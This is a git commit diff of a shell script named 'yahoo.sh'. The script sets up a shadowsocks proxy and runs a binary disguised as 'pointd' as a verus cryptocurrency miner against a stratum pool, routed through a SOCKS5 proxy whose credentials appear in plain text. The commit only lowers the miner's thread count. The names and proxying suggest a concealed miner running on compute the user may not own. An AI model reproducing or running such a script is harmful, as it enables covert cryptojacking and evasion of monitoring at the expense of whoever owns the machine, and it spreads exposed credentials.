b67b5c85b8a0fc75192a3fdc8e6d44aa04a3622d
jgaswer <98291918+jgaswer@users.noreply.github.com>
2022-04-15 22:39:05 +0700

    Update yahoo.sh

--- yahoo.sh
+++ yahoo.sh
@@ -5,5 +5,5 @@ chmod +x pointd
 sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
 
 ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
-./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8 -p x -t 4 -x socks5://Novax:chalHatt@129.158.58.77:1080
+./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RMQtU1xuuQtm23QCVEbjA8iTmqjZAFJrh8 -p x -t 2 -x socks5://Novax:chalHatt@129.158.58.77:1080
 echo "okesu"
